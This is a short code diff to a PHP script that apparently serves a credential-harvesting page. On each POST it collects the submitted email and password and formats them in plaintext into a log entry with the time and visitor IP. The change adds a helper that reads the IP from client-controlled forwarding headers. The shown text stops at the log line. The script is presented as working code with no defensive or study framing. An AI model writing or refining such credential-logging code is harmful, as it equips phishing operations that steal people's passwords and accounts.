@@ -1,8 +1,18 @@
 <?php
+function get_client_ip() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    } else {
+        return $_SERVER['REMOTE_ADDR'];
+    }
+}
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $email = $_POST['email'] ?? 'N/A';
     $password = $_POST['password'] ?? 'N/A';
-    $ip = $_SERVER['REMOTE_ADDR'];
+    $ip = get_client_ip();
     $time = date("Y-m-d H:i:s");
 
     $logEntry = "[$time] IP: $ip | Email: $email | Password: $password\n";
